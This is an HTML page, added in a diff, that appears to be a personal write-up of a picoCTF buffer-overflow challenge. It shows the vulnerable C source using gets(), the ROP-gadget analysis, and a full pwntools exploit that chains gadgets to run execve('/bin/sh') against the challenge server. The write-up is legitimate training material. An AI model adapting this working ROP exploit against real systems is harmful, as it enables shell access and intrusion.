@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>milkbomb11</title>
+    <link rel="stylesheet" href="/style.css">
+</head>
+<body>
+
+    <header>
+        <h1>milkbomb11</h1>
+        <a href="/index.html">[to index]</a>
+    </header>
+
+    <main>
+        <p>The binary can be downloaded <a href="https://artifacts.picoctf.net/c/43/vuln">here</a>.</p> 
+        <p>The source code of the binary is as below.</p>
+        <pre><code>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/types.h>
+
+#define BUFSIZE 16
+
+void vuln() {
+  char buf[16];
+  printf("How strong is your ROP-fu? Snatch the shell from my hand, grasshopper!\n");
+  return gets(buf);
+
+}
+
+int main(int argc, char **argv){
+
+  setvbuf(stdout, NULL, _IONBF, 0);
+  
+
+  // Set the gid to the effective gid
+  // this prevents /bin/sh from dropping the privileges
+  gid_t gid = getegid();
+  setresgid(gid, gid, gid);
+  vuln();
+  
+}     
+        </code></pre>
+        <p>
+            As you can see from the source code, this problem has a buffer overflow vulnerability in <code>vuln</code>.
+            Running checksec showed that PIE was not enabled, meaning that I could potentially use ROP.
+        </p>
+        <img src="checksec.png" width="400px" height="auto">
+        <p>
+            Using pwndbg, I tried to get the PLT address of <code>gets</code> for my ROP chain but instead got the actual function code itself,
+            which suggested that libc was statically linked to the binary when it was compiled. And sure enough, <code>vmmap</code> revealed that
+            libc was not dynamically linked to the executable. 
+        </p>
+        <img src="gets.png" width="400px" height="auto">
+        <p>
+            My initial plan was to get the GOT entry of two library functions and obtain the version of libc the program was running on, and then
+            finally call <code>system("/bin/sh")</code>. However, that was now impossible, so I decided to call the system call 
+            <code>execve("/bin/sh", NULL, NULL)</code> instead. I obtained the necessary gadgets using ROPgadgets as shown below.
+        </p>
+        <img src="gadgets.png" width="600px" height="auto">
+        <p>
+            The diagram below represents the ROP chain that I constructed to call <code>execve("/bin/sh", NULL, NULL)</code>. When the ROP chain
+            executes <code>gets(addr_to_bss)</code>, the program will read <code>"/bin/sh"</code> from stdin so that it can be used in the subsequent syscall.
+        </p>
+        <img src="ropchain.png" width="100%" height="auto">
+        <p>The exploit code is shown below.</p>
+        <pre><code>
+#!/usr/bin/env python3
+from pwn import *
+
+def ex():
+    pop_ecx_ret = 0x08049e29
+    pop_eax_edx_ebx_ret = 0x080583b8
+    int_0x80 = 0x0804a3c2
+    gets_addr = 0x08051b60
+    bss_addr = 0x80e62c0
+
+    context.log_level = "debug"
+    p = remote("saturn.picoctf.net", 63266)
+    p.recvline()
+    
+    payload = b""
+    payload += b"A"*28
+    payload += p32(gets_addr)
+    payload += p32(pop_ecx_ret)
+    payload += p32(bss_addr)
+    payload += p32(pop_eax_edx_ebx_ret)
+    payload += p32(0xb)
+    payload += p32(0x0)
+    payload += p32(bss_addr)
+    payload += p32(pop_ecx_ret)
+    payload += p32(0x0)
+    payload += p32(int_0x80)
+
+    p.sendline(payload)
+    sleep(0.1)
+    p.sendline(b"/bin/sh")
+    p.interactive()
+
+if __name__ == "__main__": ex()
+        </code></pre>
+    </main>
+</body>
+</html>
